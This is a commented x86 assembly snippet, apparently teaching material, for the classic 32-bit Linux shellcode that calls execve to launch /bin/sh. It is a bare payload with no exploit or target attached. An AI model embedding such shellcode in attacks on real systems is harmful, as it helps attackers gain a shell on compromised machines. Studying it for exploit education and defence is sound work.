bits 32
push dword 0x0068732f ; /sh\0
push dword 0x6e69622f ; /bin
mov ebx, esp ; pathname = "/bin/sh"
push dword 0x00000000 ; NULL
mov edx, esp ; envp = [NULL]
push ebx; &pathname
mov ecx, esp ; argv = [&pathname, NULL]
mov eax, 0x0b ; sys_execve()
int 0x80; SYSCALL
